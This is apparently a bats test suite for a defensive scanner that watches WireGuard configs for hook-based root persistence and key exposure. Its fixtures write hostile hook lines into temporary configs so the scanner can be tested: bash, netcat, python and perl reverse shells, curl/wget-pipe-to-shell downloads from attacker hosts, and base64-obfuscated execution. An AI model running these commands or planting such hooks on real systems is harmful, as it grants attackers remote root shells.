#!/usr/bin/env bats
# L2 bats functional tests for the wireguard-config-watchdog scan script.
#
# wg-quick runs the PostUp/PreUp/PostDown/PreDown directives in each
# /etc/wireguard/*.conf AS ROOT on tunnel up/down — a planted hook is
# root-exec-on-tunnel-event persistence (T1546). Because each .conf holds the
# [Interface] PrivateKey, a world-readable .conf is private-key exposure
# (T1552.001). A .conf that is world-writable / non-root-owned, world-readable
# while carrying a PrivateKey, or whose hook command carries an injection
# pattern (incl. a writable-root path), is alert.
#
# wg .conf files are 0600 by convention; printf-created files default to a
# world-readable mode, so benign baselines are chmod 0600 explicitly.
#
# Run with: bats packaging/test/L2-wireguard-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/wireguard-config-watchdog/systemd/wireguard-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    WGD="${TMP}/wireguard"; mkdir -p "${WGD}"
    CONF="${WGD}/wg0.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_WIREGUARD_PROFILE="${PROFILE:-report}" \
    SELFDEF_WIREGUARD_BASELINE="${BASELINE}" \
    SELFDEF_WIREGUARD_DIRS="${DIRS_V:-$WGD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# Benign 0600 config with a PrivateKey + a benign PostUp.
seed_benign() {
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWxfMDAwMDAwMDAwMDA=\nAddress = 10.0.0.2/24\nPostUp = wg set %%i fwmark 51820\n' > "${CONF}"
    chmod 0600 "${CONF}"
}

@test "no wireguard configs → ok / no_wireguard" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_wireguard"'
    cap | grep -q '"severity":"ok"'
}

@test "benign 0600 config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / wireguard_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"wireguard_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a PostUp hook with an injection pattern → alert / wireguard_suspicious" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"wireguard_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a PostUp hook under a writable root → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /tmp/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-readable config holding a PrivateKey → alert (key exposure)" {
    seed_benign
    run_wd
    chmod 0644 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign config change → warn / wireguard_changed" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWxfMDAwMDAwMDAwMDA=\nAddress = 10.0.0.3/24\nPostUp = wg set %%i fwmark 51820\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"wireguard_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign 0600 config is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious PostUp hook" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /tmp/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — wireguard config inventory enumerates tunnel-event-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (PostUp under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /var/tmp/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PreUp directive — symmetric to PostUp): writable-root → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPreUp = /tmp/.preup\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PostDown directive — symmetric to PostUp): writable-root → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostDown = /tmp/.postdown\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in PostUp): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = wget -qO- http://attacker/p | sh\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in PostUp): obfuscation → alert" {
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = echo YmFzaCAtaQ== | base64 -d | bash\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-wireguard -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): wireguard-config-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 tunnel-event-triggered root-exec persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
    chmod 0600 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"wireguard_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PreDown directive — full 4-axis hook coverage with PreUp/PostUp/PostDown)" {
    # The 4 hook directives are PreUp/PostUp/PreDown/PostDown. Existing
    # tests cover 3; lock the 4th (PreDown) too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPreDown = /tmp/.predown\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PostUp under /dev/shm — tmpfs writable-root coverage on hook axis)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /dev/shm/.up\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in PostUp)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = curl -s http://attacker.com/p | bash\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in PostUp hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. WireGuard PostUp/PreUp/PostDown/PreDown
    # hooks fire AS ROOT on every tunnel state change — a recurring
    # trigger when the operator brings the VPN up/down (or
    # auto-reconnect fires on link flap). Sister-vector to
    # openvpn-config + nm-vpn-plugin on the VPN tunnel persistence
    # brain.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = nc -e /bin/sh 1.1.1.1 4444\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on WireGuard PostUp surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the VPN-
    # tunnel-state-change root-exec persistence surface (T1546
    # — WireGuard PostUp/PreUp/PostDown/PreDown hooks fire AS
    # ROOT on every tunnel state change; recurring trigger
    # when operator brings VPN up/down).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on WireGuard PostUp surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp WireGuard
    # hook rev-shell variants. Perl on every Debian/Ubuntu.
    # Locks perl axis on T1546 VPN-tunnel-state-change root-
    # exec persistence — hooks fire AS ROOT on every up/down.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: PostUp invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # VPN-tunnel-state-change root-exec persistence — hooks fire
    # AS ROOT on every wg-quick up/down. Beyond inline rev-shell
    # payloads, attackers stage benign-looking PostUp that
    # invokes binary in writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /var/tmp/staged_payload\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on wireguard-config surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The wireguard-config-watchdog MUST only emit severity
    # values from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers branch on the literal severity string;
    # an out-of-set value silently falls through routing and the
    # operator never sees the T1546 VPN-tunnel-state-change
    # root-exec persistence alert. Locks parser contract on the
    # WireGuard PostUp/PreUp/PostDown/PreDown hook detection
    # surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /tmp/.evil\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: wireguard-config-watchdog NEVER deletes wg config entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # wireguard-config-watchdog DETECTS T1546 VPN-tunnel-state-
    # change root-exec persistence via PostUp/PreUp/PostDown/
    # PreDown hooks but MUST NEVER emit sed/awk/rm commands to
    # auto-clean the hook directive. The detected hook may be
    # operator-legitimate (custom firewall-rule update on
    # tunnel state change, DNS-resolver update, route table
    # refresh). Silent auto-delete would destroy operator
    # baseline state AND could break tunnel functionality.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the wireguard-config surveillance substrate.
    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /tmp/.evil\n' > "${CONF}"
    chmod 0600 "${CONF}"
    run_wd
    [ -f "${CONF}" ]
    grep -q 'PostUp' "${CONF}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*sed[[:space:]]+-i.*wg'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # wireguard-config-watchdog runs ON the timer's scheduled
    # fire — scans /etc/wireguard/*.conf for PostUp/PostDown/
    # PreUp/PreDown injection patterns, emits a verdict, then
    # exits. Type=simple would break timer OnUnitActiveSec
    # semantics. Locks oneshot-probe contract on the wireguard-
    # config-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/wireguard-config-watchdog/systemd/selfdef-wireguard.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. wireguard-config-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # wireguard-config-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # wireguard-config-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/wireguard-config-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'wireguard-config-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}
